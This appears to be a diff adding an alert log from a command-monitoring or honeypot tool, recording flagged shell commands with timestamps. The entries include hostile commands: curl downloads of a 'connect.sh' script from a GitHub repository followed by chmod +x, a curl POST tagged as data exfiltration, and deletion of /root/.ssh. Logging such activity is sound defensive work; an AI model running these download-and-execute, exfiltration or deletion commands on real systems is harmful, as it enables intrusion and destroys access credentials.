@@ -1,0 +1,112 @@
+🚨 ALERT! Suspicious command detected!
+Command: curl
+Log: 2026-03-25 05:05:31.741366 ('127.0.0.1', 60620) CMD=curl adsa.h  CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: curl
+Log: 2026-03-25 05:28:26.466035 ('127.0.0.1', 59900) CMD=curl sds.sh  CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: curl
+Log: 2026-03-25 05:45:13.243034 ('127.0.0.1', 59900) CMD=curl githu  CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: curl
+Log: 2026-03-25 05:48:11.372045 ('127.0.0.1', 32810) CMD=curl -X POST http://192.168.1.100:8080/upload [DATA_EXFIL] CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: rm
+Log: 2026-03-25 05:49:00.991000 ('127.0.0.1', 32810) CMD=rm le.sh  CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: rm
+Log: 2026-03-25 05:49:11.307823 ('127.0.0.1', 32810) CMD=rm file.sh  CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: rm
+Log: 2026-03-25 05:49:32.490801 ('127.0.0.1', 32810) CMD=rm upload  CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: netstat
+Log: 2026-03-25 06:11:08.102074 ('127.0.0.1', 32810) CMD=netstat  CWD=/tmp
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: curl
+Log: 2026-03-25 06:11:22.279493 ('127.0.0.1', 32810) CMD=curl -O https://raw.githubusercontent.com/Dineshwer/temp/main/connect.sh [PAYLOAD_DOWNLOAD] CWD=/tmp
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: chmod
+Log: 2026-03-25 06:11:30.968273 ('127.0.0.1', 32810) CMD=chmod +x connect.sh  CWD=/tmp
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: rm
+Log: 2026-03-25 06:13:41.709063 ('127.0.0.1', 32810) CMD=rm connect.sh  CWD=/tmp
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: netstat
+Log: 2026-03-25 06:21:47.862882 ('127.0.0.1', 32810) CMD=netstat  CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: curl
+Log: 2026-03-25 06:21:57.891462 ('127.0.0.1', 32810) CMD=curl -O https://raw.githubusercontent.com/Dineshwer/temp/main/connect.sh [PAYLOAD_DOWNLOAD] CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: chmod
+Log: 2026-03-25 06:22:10.857514 ('127.0.0.1', 32810) CMD=chmod +x connect.sh  CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: rm
+Log: 2026-03-25 06:22:42.340129 ('127.0.0.1', 32810) CMD=rm -f connect.sh  CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: rm
+Log: 2026-03-25 06:22:50.235406 ('127.0.0.1', 32810) CMD=rm connect.sh  CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: rm
+Log: 2026-03-25 06:25:41.026704 ('127.0.0.1', 32810) CMD=rm connect.sh  CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: curl
+Log: 2026-03-25 06:26:28.426993 ('127.0.0.1', 51704) CMD=curl -O https://raw.githubusercontent.com/Dineshwer/temp/main/connect.sh [PAYLOAD_DOWNLOAD] CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: rm
+Log: 2026-03-25 06:27:27.408452 ('127.0.0.1', 51704) CMD=rm connect.sh  CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: curl
+Log: 2026-03-25 06:34:02.649876 ('127.0.0.1', 51704) CMD=curl -O https://github.com/Dineshwer/temp/connect.sh [PAYLOAD_DOWNLOAD] CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: curl
+Log: 2026-03-25 06:34:58.873262 ('127.0.0.1', 51704) CMD=curl -O https://github.com/Dineshwer/temp/connect.sh [PAYLOAD_DOWNLOAD] CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: curl
+Log: 2026-03-25 06:35:02.690903 ('127.0.0.1', 51704) CMD=curl -O https://github.com/Dineshwer/temp/connect.sh [PAYLOAD_DOWNLOAD] CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: rm
+Log: 2026-03-25 06:35:08.703978 ('127.0.0.1', 51704) CMD=rm connect.sh  CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: rm
+Log: 2026-03-25 06:35:12.006832 ('127.0.0.1', 51704) CMD=rm connect.sh  CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: curl
+Log: 2026-03-25 06:50:23.516064 ('127.0.0.1', 47140) CMD=curl -O https://github.com/Dineshwer/temp/connect.sh [PAYLOAD_DOWNLOAD] CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: rm
+Log: 2026-03-25 06:51:08.511524 ('127.0.0.1', 47140) CMD=rm connect.sh  CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: curl
+Log: 2026-03-25 06:51:23.203950 ('127.0.0.1', 47140) CMD=curl -O https://github.com/Dineshwer/temp/connect.sh [PAYLOAD_DOWNLOAD] CWD=/
+--------------------------------------------------
+🚨 ALERT! Suspicious command detected!
+Command: rm
+Log: 2026-03-26 06:50:41.589511 ('127.0.0.1', 37504) CMD=rm .ssh  CWD=/root
+--------------------------------------------------
